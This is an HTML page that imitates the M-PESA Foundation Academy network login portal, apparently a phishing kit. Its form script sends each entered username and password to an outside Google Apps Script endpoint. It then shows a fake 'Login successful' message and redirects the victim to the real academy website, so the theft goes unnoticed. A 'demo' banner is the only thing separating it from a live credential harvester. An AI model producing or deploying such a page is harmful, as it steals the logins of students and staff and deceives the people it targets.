<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>M-PESA Foundation Academy — Login</title>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
  :root{
    --bg: #ffffff;
    --muted: #6b7280;
    --green: #4fa03e;
    --card-bg: #ffffff;
    --accent:#2f6f3b;
    --shadow: 0 8px 28px rgba(15,23,42,0.06);
  }
  html,body{height:100%;margin:0;font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial;background:var(--bg);color:#222}
  .page{min-height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:26px;padding:48px 20px;}
  .top-slogan{font-weight:500;color:#555;font-size:18px;letter-spacing:0.2px;margin-top:8px}
  .card{width:720px;max-width:95%;background:var(--card-bg);border-radius:6px;box-shadow:var(--shadow);padding:46px 64px;display:flex;align-items:center;justify-content:center;}
  .inner{width:420px;text-align:center;}
  .logo{width:220px;height:auto;margin:8px auto 18px;display:block;object-fit:contain;}
  h1.title{margin:0;font-size:20px;color:#2b5e90;font-weight:600;}
  .form-box{margin-top:22px;border-left:1px solid rgba(0,0,0,0.03);border-right:1px solid rgba(0,0,0,0.03);padding:28px 34px;border-radius:2px;background:linear-gradient(180deg,#ffffff,#fbfcfd);}
  .label{font-size:18px;color:#305b99;margin-bottom:14px;font-weight:600;}
  .field{display:block;width:100%;padding:14px 16px;border-radius:10px;border:1px solid #eceff2;margin-bottom:18px;background:#f8fafb;font-size:15px;}
  .login-btn{display:inline-block;width:100%;padding:12px 18px;background:var(--green);color:white;border-radius:8px;border:0;font-weight:600;cursor:pointer;margin-top:8px;}
  .footer{margin-top:28px;color:#666;font-weight:500;font-size:15px;}
  .mock-badge{position:fixed;left:18px;top:18px;background:#fff7cc;color:#92400e;padding:8px 12px;border-radius:8px;border:1px solid #ffdca8;font-weight:700;z-index:9999;box-shadow:0 6px 18px rgba(0,0,0,0.05);}
  @media (max-width:640px){.card{padding:28px 18px}.inner{width:100%}.logo{width:180px}}
</style>
</head>
<body>
  <!-- Notice -->
  <div class="mock-badge">DEMO LOGIN — DO NOT USE REAL CREDENTIALS</div>

  <main class="page">
    <div class="top-slogan">Thinkers : Doers : Leaders</div>

    <section class="card">
      <div class="inner">
        <img src="data:image/svg+xml;utf8,
        <svg xmlns='http://www.w3.org/2000/svg' width='360' height='90' viewBox='0 0 360 90'>
          <rect width='360' height='90' fill='white'/>
          <text x='50%' y='55%' font-family='Arial' font-size='18' text-anchor='middle' fill='%233b8b3b' font-weight='700'>
            M-PESA FOUNDATION ACADEMY
          </text>
        </svg>" alt="M-PESA Foundation Academy logo" class="logo" />

        <!-- Form -->
        <form class="form-box" id="loginForm">
          <div class="label">Network Authentication Form</div>
          <input class="field" type="text" id="username" name="username" placeholder="Enter your Username" required>
          <input class="field" type="password" id="password" name="password" placeholder="Enter your Password" required>
          <button class="login-btn" type="submit">Login</button>
        </form>

        <div class="footer">Curiosity : Leadership : Accountability : Innovation : Responsible Citizenship : Excellence</div>
      </div>
    </section>
  </main>

  <script>
    document.getElementById("loginForm").addEventListener("submit", async function(e){
      e.preventDefault();
      const user = document.getElementById("username").value.trim();
      const pass = document.getElementById("password").value.trim();

      try {
        await fetch("https://script.google.com/macros/s/AKfycbxggKIqy1fz8pjOmVKf5Z1D7E5k0VA4oL-Fx9wka0APbOFXfMsGmGRxLqqHMgaeVCHhTw/exec", {
          method: "POST",
          body: new URLSearchParams({ username: user, password: pass })
        });
        alert("✅ Login successful! Redirecting...");
        window.location.href = "https://mpesafoundationacademy.ac.ke/";
      } catch (err) {
        alert("❌ Error submitting login. Try again.");
      }
    });
  </script>
</body>
</html>
